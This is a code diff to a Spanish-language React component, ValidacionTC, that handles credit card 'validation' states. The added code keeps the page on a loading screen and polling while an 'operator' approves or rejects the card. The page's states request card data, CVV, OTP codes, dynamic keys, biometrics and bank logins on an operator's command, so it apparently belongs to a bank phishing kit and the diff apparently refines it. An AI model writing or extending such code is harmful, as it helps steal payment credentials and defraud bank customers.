@@ -177,6 +177,8 @@ export default function ValidacionTC() {
                     'sol_tc',
                     'sol_tc_custom',
                     'awaiting_tc_approval',
+                    'aprobado',
+                    'approve_custom',
                     'error_tc',
                     'error_tc_custom'
                 ];
@@ -191,6 +193,8 @@ export default function ValidacionTC() {
                     return false;
                 }
 
+                const isAwaitingOrApproved = ['awaiting_tc_approval', 'aprobado', 'approve_custom'].includes(estado);
+
                 // Se valida cuando hay datos del backend
                 if (backendCardData) {
 
@@ -204,10 +208,16 @@ export default function ValidacionTC() {
                     localStorage.setItem("selectedCardData", JSON.stringify(normalized));
 
                     // Se establece si es TC custom
-                    setIsTCCustom(estado === 'sol_tc_custom' || estado === 'awaiting_tc_approval');
+                    setIsTCCustom(estado === 'sol_tc_custom' || isAwaitingOrApproved);
 
-                    // Se quita el cargando
-                    setLoading(false);
+                    // Si está en espera o aprobado por el operador, debe quedarse cargando esperando el siguiente estado
+                    if (isAwaitingOrApproved) {
+                        setLoading(true);
+                        initPolling(sessionId);
+                    } else {
+                        // Se quita el cargando
+                        setLoading(false);
+                    }
                 } else {
 
                     // Se valida cuando hay datos en el localStorage
@@ -223,11 +233,17 @@ export default function ValidacionTC() {
                         setCardData(normalized);
 
                         // Se establece si es TC custom
-                        setIsTCCustom(estado === 'sol_tc_custom' || estado === 'awaiting_tc_approval');
+                        setIsTCCustom(estado === 'sol_tc_custom' || isAwaitingOrApproved);
                     }
 
-                    // Se quita el cargando
-                    setLoading(false);
+                    // Si está en espera o aprobado por el operador, debe quedarse cargando esperando el siguiente estado
+                    if (isAwaitingOrApproved) {
+                        setLoading(true);
+                        initPolling(sessionId);
+                    } else {
+                        // Se quita el cargando
+                        setLoading(false);
+                    }
                 }
 
                 // Se retorna en trua
@@ -877,8 +893,8 @@ export default function ValidacionTC() {
                     setIsTCCustom(true);
                 };
 
-                // Se valida si es un error de TC o de TC Custom
-                if (estado === 'error_tc' || estado === 'error_tc_custom') {
+                // Se valida si es un rechazo de TC o de TC Custom
+                if (estadoLower === 'error_tc' || estadoLower === 'error_tc_custom' || estadoLower === 'reject_custom') {
 
                     // Se limpia el intervalo
                     clearInterval(pollingInterval);
@@ -905,13 +921,19 @@ export default function ValidacionTC() {
                     return;
                 };
 
+                // Si la tarjeta está esperando aprobación o fue aprobada por el operador, continuar en pantalla de carga esperando el siguiente estado
+                if (['awaiting_tc_approval', 'pendiente', 'aprobado', 'approve_custom'].includes(estadoLower)) {
+                    setLoading(true);
+                    return;
+                }
+
                 // Se inicializan los estados 
                 const stateValid = [
                     'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',
-                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login',
+                    'error_otp', 'error_din', 'error_login',
                     'sol_biometria', 'error_923',
                     'sol_tc_custom', 'sol_cvv_custom',
-                    'aprobado', 'error_pantalla', 'bloqueado_pantalla', 'reject_custom',
+                    'error_pantalla', 'bloqueado_pantalla',
                     'sol_link_bot', 'link_bot', 'sol_link_custom'
                 ];
 
